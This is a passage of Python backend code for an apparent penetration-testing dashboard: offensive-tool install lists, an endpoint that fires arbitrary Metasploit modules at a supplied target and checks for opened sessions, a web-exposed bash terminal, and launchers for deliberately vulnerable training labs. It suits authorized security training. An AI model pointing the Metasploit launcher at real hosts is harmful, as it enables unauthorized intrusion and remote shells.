    {"name":"subfinder",   "url":"https://github.com/projectdiscovery/subfinder","install":"cd /opt/subfinder && go install ./..."},
    {"name":"httpx",       "url":"https://github.com/projectdiscovery/httpx",  "install":"cd /opt/httpx && go install ./..."},
    {"name":"dnsx",        "url":"https://github.com/projectdiscovery/dnsx",   "install":"cd /opt/dnsx && go install ./..."},
    {"name":"nuclei",      "url":"https://github.com/projectdiscovery/nuclei", "install":"cd /opt/nuclei && go install ./..."},
    {"name":"dalfox",      "url":"https://github.com/hahwul/dalfox",           "install":"cd /opt/dalfox && go install ."},
    {"name":"trufflehog",  "url":"https://github.com/trufflesecurity/trufflehog","install":"cd /opt/trufflehog && go install ."},
    {"name":"gitleaks",    "url":"https://github.com/gitleaks/gitleaks",       "install":"cd /opt/gitleaks && go build -o /usr/local/bin/gitleaks ."},
    {"name":"sherlock",    "url":"https://github.com/sherlock-project/sherlock","install":"cd /opt/sherlock && pip3 install ."},
    {"name":"spiderfoot",  "url":"https://github.com/smicallef/spiderfoot",    "install":"cd /opt/spiderfoot && pip3 install -r requirements.txt"},
    {"name":"impacket",    "url":"https://github.com/fortra/impacket",         "install":"cd /opt/impacket && pip3 install ."},
    {"name":"pspy",        "url":"https://github.com/DominicBreuker/pspy",     "install":"cd /opt/pspy && go build -o /usr/local/bin/pspy ."},
]

PIP_TOOLS = [
    "pwntools","ropper","angr","frida-tools","objection",
    "impacket","bloodhound","crackmapexec","arjun","scapy",
    "requests","beautifulsoup4","shodan","censys",
]

@app.post("/api/msf/run")
async def msf_run(req: dict, user=Depends(verify_token)):
    module  = req.get("module","")
    target  = req.get("target","")
    lhost   = req.get("lhost","")
    lport   = req.get("lport", 4444)
    if not module: return {"error":"Module required"}
    if not target: return {"error":"Target required"}
    cmds = (f"use {module}; set RHOSTS {target}; set LHOST {lhost}; set LPORT {lport}; "
            f"set ExitOnSession false; run -j; sleep 10; sessions -l; exit -y")
    r = await run_tool(["msfconsole","-q","--no-readline","-x",cmds], timeout=90)
    out = r.get("output","")
    opened = bool(re.search(r"session \d+ (opened|created)", out, re.I))
    return {"output": out[-800:], "session_opened": opened,
            "message": f"✅ Session opened!" if opened else f"Module ran — no session (check target is vulnerable)"}

@app.post("/api/tools/status")
async def tools_status(user=Depends(verify_token)):
    status = {}
    for tool, cmd in TOOL_CHECKS.items():
        r = subprocess.run(["which", cmd], capture_output=True)
        status[tool] = "ok" if r.returncode == 0 else "missing"
    return {"status": status}

@app.post("/api/tools/install")
async def tools_install(req: dict, user=Depends(verify_token)):
    mode = req.get("mode", "all")
    log = []
    installed = 0

    env = {**os.environ, "DEBIAN_FRONTEND":"noninteractive", "PYTHONUNBUFFERED":"1"}
    async def run_cmd(cmd, desc):
        nonlocal installed
        log.append(f"🔄 {desc}")
        try:
            r = subprocess.run(["bash","-c",cmd], capture_output=True, text=True, timeout=300, env=env)
            out = (r.stdout+r.stderr).strip()[-150:]
            if r.returncode == 0:
                log.append(f"  ✅ Done{(' — '+out) if out else ''}")
                installed += 1
            else:
                log.append(f"  ⚠ {out or 'Error (exit '+str(r.returncode)+')'}")
        except subprocess.TimeoutExpired:
            log.append(f"  ⏱ Timeout (continuing)")
        except Exception as e:
            log.append(f"  ❌ {e}")

    if mode in ("update","all","upgrade"):
        log.append("━━━ SYSTEM UPDATE ━━━")
        await run_cmd("apt-get update -y 2>&1 | tail -3", "apt update")
        await run_cmd("apt-get upgrade -y 2>&1 | tail -3", "apt upgrade")
        await run_cmd("apt-get dist-upgrade -y 2>&1 | tail -3", "dist-upgrade")
        await run_cmd("apt-get autoremove -y 2>&1 | tail -3", "autoremove")

    if mode in ("all",):
        log.append("━━━ APT PACKAGES ━━━")
        pkgs = " ".join(APT_PACKAGES)
        await run_cmd(f"apt-get install -y {pkgs} 2>&1 | tail -5", f"Installing {len(APT_PACKAGES)} apt packages")

        log.append("━━━ PIP TOOLS ━━━")
        for pkg in PIP_TOOLS:
            await run_cmd(f"pip3 install --upgrade {pkg} -q 2>&1 | tail -2", f"pip: {pkg}")

    if mode in ("all","github"):
        log.append("━━━ GITHUB TOOLS ━━━")
        os.makedirs("/opt", exist_ok=True)
        for tool in GITHUB_TOOLS:
            dest = f"/opt/{tool['name']}"
            if os.path.exists(dest):
                await run_cmd(f"cd {dest} && git pull 2>&1 | tail -2", f"Update: {tool['name']}")
            else:
                await run_cmd(f"git clone --depth=1 {tool['url']} {dest} 2>&1 | tail -2", f"Clone: {tool['name']}")
            if tool["install"]:
                await run_cmd(tool["install"] + " 2>&1 | tail -3", f"Build: {tool['name']}")

        # Go tools via go install
        go_tools = [
            "github.com/OJ/gobuster/v3@latest",
            "github.com/ffuf/ffuf/v2@latest",
            "github.com/tomnomnom/waybackurls@latest",
            "github.com/tomnomnom/anew@latest",
            "github.com/tomnomnom/qsreplace@latest",
            "github.com/tomnomnom/gf@latest",
        ]
        for gt in go_tools:
            name = gt.split("/")[-1].split("@")[0]
            await run_cmd(f"go install {gt} 2>&1 | tail -2", f"go install: {name}")

    if mode == "upgrade":
        log.append("━━━ UPGRADE INSTALLED ━━━")
        await run_cmd("apt-get upgrade -y 2>&1 | tail -5", "apt upgrade all")
        await run_cmd("pip3 list --outdated --format=freeze 2>/dev/null | cut -d= -f1 | xargs -r pip3 install --upgrade -q", "pip upgrade all")
        for tool in GITHUB_TOOLS:
            dest = f"/opt/{tool['name']}"
            if os.path.exists(dest):
                await run_cmd(f"cd {dest} && git pull 2>&1 | tail -2", f"Update: {tool['name']}")

    log.append(f"✅ Complete — {installed} operations succeeded")
    return {"log": log, "installed": installed}

# ══════════════════════════════════════════════════════════════
#  EMBEDDED TERMINAL (PTY sessions)
# ══════════════════════════════════════════════════════════════
import pty as _pty_mod, select as _sel_mod, termios as _tios_mod, fcntl as _fcntl_mod

_pty_sessions = {}  # sid -> {master, proc, buf}

@app.post("/api/terminal/create")
async def terminal_create(user=Depends(verify_token)):
    import uuid
    sid = uuid.uuid4().hex[:8]
    master, slave = _pty_mod.openpty()
    proc = subprocess.Popen(
        ["bash","--norc","--noprofile"],
        stdin=slave, stdout=slave, stderr=slave,
        preexec_fn=os.setsid, close_fds=True
    )
    os.close(slave)
    import fcntl, termios
    flags = fcntl.fcntl(master, fcntl.F_GETFL)
    fcntl.fcntl(master, fcntl.F_SETFL, flags | os.O_NONBLOCK)
    _pty_sessions[sid] = {"master": master, "proc": proc, "buf": ""}
    return {"session_id": sid, "ok": True}

@app.post("/api/terminal/input")
async def terminal_input(req: dict, user=Depends(verify_token)):
    sid = req.get("session_id","")
    cmd = req.get("input","")
    if sid not in _pty_sessions:
        return {"ok": False, "error": "Session not found"}
    try:
        os.write(_pty_sessions[sid]["master"], (cmd + "\n").encode())
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}

@app.post("/api/terminal/output")
async def terminal_output(req: dict, user=Depends(verify_token)):
    sid = req.get("session_id","")
    if sid not in _pty_sessions:
        return {"output": "", "new": "", "error": "Session not found"}
    master = _pty_sessions[sid]["master"]
    new_out = ""
    import re as _re2
    try:
        # Drain all available output instantly
        chunks = []
        for _ in range(20):  # max 20 reads per call
            r,_,_ = _sel_mod.select([master],[],[],0.02)
            if not r: break
            try:
                chunk = os.read(master, 8192)
                if not chunk: break
                chunks.append(chunk)
            except BlockingIOError:
                break
        if chunks:
            raw = b"".join(chunks).decode("utf-8", errors="replace")
            # Strip ANSI escape codes
            raw = _re2.sub(r'\x1b\[[0-9;]*[mABCDEFGHJKLMnsuhl]', '', raw)
            raw = _re2.sub(r'\x1b\[?\??[0-9;]*[lh]', '', raw)
            raw = _re2.sub(r'\x1b\][^\x07]*\x07', '', raw)  # OSC sequences
            raw = _re2.sub(r'\r', '', raw)  # carriage returns
            _pty_sessions[sid]["buf"] += raw
            new_out = raw
    except Exception:
        pass
    return {"new": new_out}

@app.post("/api/terminal/close")
async def terminal_close(req: dict, user=Depends(verify_token)):
    sid = req.get("session_id","")
    if sid in _pty_sessions:
        try:
            _pty_sessions[sid]["proc"].kill()
            os.close(_pty_sessions[sid]["master"])
        except: pass
        del _pty_sessions[sid]
    return {"ok": True}

# ══════════════════════════════════════════════════════════════
#  LAB MANAGER — Docker-based vulnerable targets
# ══════════════════════════════════════════════════════════════

LAB_TARGETS = [
    {"id":"dvwa",       "name":"DVWA",              "image":"vulnerables/web-dvwa",    "port":8001, "internal":80,  "proto":"http", "category":"Web App",    "desc":"Damn Vulnerable Web Application — SQL injection, XSS, CSRF, file upload, command injection", "creds":"admin/password", "icon":"🌐"},
    {"id":"webgoat",    "name":"WebGoat",            "image":"webgoat/webgoat",         "port":8002, "internal":8080,"proto":"http", "category":"Web App",    "desc":"OWASP WebGoat — interactive web security lessons covering OWASP Top 10",                     "creds":"guest/guest",    "icon":"🐐"},
    {"id":"juiceshop",  "name":"OWASP Juice Shop",   "image":"bkimminich/juice-shop",   "port":8003, "internal":3000,"proto":"http", "category":"Web App",    "desc":"Modern vulnerable web app — 100+ challenges covering XSS, SQLi, auth bypass, SSRF",         "creds":"admin@juice-sh.op/admin123","icon":"🧃"},
    {"id":"mutillidae", "name":"Mutillidae II",       "image":"webpwnized/mutillidae",   "port":8004, "internal":80,  "proto":"http", "category":"Web App",    "desc":"NOWASP Mutillidae — 40+ vulnerabilities, all OWASP categories",                             "creds":"admin/adminpass","icon":"🦟"},
    {"id":"bwapp",      "name":"bWAPP",               "image":"raesene/bwapp",           "port":8005, "internal":80,  "proto":"http", "category":"Web App",    "desc":"Buggy Web Application — 100+ web bugs, PHP/MySQL based",                                     "creds":"bee/bug",        "icon":"🐛"},
    {"id":"nodegoat",   "name":"NodeGoat",            "image":"owasp/nodegoat",          "port":8007, "internal":4000,"proto":"http", "category":"Web App",    "desc":"OWASP NodeGoat — Node.js/Express vulnerabilities, A1-A10",                                  "creds":"admin@nodegoat.com/Admin1234!","icon":"🟢"},
    {"id":"vulnserver",  "name":"VulnServer (BOF)",   "image":"",                        "port":9999, "internal":9999,"proto":"tcp",  "category":"Binary Exploit","desc":"Custom C server vulnerable to buffer overflow — practice EIP control, JMP ESP, shellcode",  "creds":"N/A",            "icon":"💣"},
]

@app.get("/api/lab/targets")
async def lab_targets(user=Depends(verify_token)):
    results = []
    for t in LAB_TARGETS:
        status = "stopped"
        if t["image"]:
            r = subprocess.run(["docker","inspect","--format","{{.State.Running}}",f"lab_{t['id']}"],
                               capture_output=True, text=True)
            status = "running" if r.stdout.strip()=="true" else "stopped"
        else:
            # Check vulnserver by port
            import socket as _sock2
            try:
                s = _sock2.socket(); s.settimeout(1); s.connect(("127.0.0.1",t["port"])); s.close()
                status = "running"
            except: status = "stopped"
        results.append({**t, "status": status})
    return {"targets": results}

@app.post("/api/lab/start")
async def lab_start(req: dict, user=Depends(verify_token)):
    tid = req.get("id","")
    t = next((x for x in LAB_TARGETS if x["id"]==tid), None)
    if not t: return {"ok":False,"error":"Unknown target"}

    if tid == "vulnserver":
        binary = "/tmp/vulnserver"
        _ensure_vulnserver(binary)
        subprocess.run(["pkill","-f","vulnserver"], capture_output=True)
        await asyncio.sleep(0.3)
        subprocess.Popen([binary], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        await asyncio.sleep(1)
        return {"ok":True,"message":f"VulnServer started on port 9999"}

    r = subprocess.run(
        ["docker","run","-d","--rm","--name",f"lab_{tid}",
         "-p",f"{t['port']}:{t['internal']}", t["image"]],
        capture_output=True, text=True)
    if r.returncode == 0 or "already in use" in r.stderr:
        return {"ok":True,"message":f"{t['name']} started on port {t['port']}","url":f"http://KALI_IP:{t['port']}"}
    return {"ok":False,"error":r.stderr.strip()[:200]}

@app.post("/api/lab/stop")
async def lab_stop(req: dict, user=Depends(verify_token)):
    tid = req.get("id","")
    t = next((x for x in LAB_TARGETS if x["id"]==tid), None)
    if not t: return {"ok":False,"error":"Unknown target"}
    if tid == "vulnserver":
        subprocess.run(["pkill","-f","vulnserver"], capture_output=True)
        return {"ok":True,"message":"VulnServer stopped"}
    r = subprocess.run(["docker","stop",f"lab_{tid}"], capture_output=True, text=True)
    return {"ok": r.returncode==0, "message": f"{t['name']} stopped"}

@app.post("/api/lab/start_all")
async def lab_start_all(user=Depends(verify_token)):
    log = []
    for t in LAB_TARGETS:
        if not t["image"]:
            binary = "/tmp/vulnserver"
            _ensure_vulnserver(binary)
            subprocess.Popen([binary], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log.append(f"✅ VulnServer started on :9999")
            continue
        r = subprocess.run(
            ["docker","run","-d","--rm","--name",f"lab_{t['id']}",
             "-p",f"{t['port']}:{t['internal']}", t["image"]],
            capture_output=True, text=True)
        if r.returncode == 0:
            log.append(f"✅ {t['name']} started → http://KALI_IP:{t['port']}")
        elif "already in use" in r.stderr or "already exists" in r.stderr:
            log.append(f"ℹ {t['name']} already running on :{t['port']}")
        else:
            log.append(f"❌ {t['name']} failed: {r.stderr.strip()[:80]}")
        await asyncio.sleep(0.2)
    return {"ok":True,"log":log}
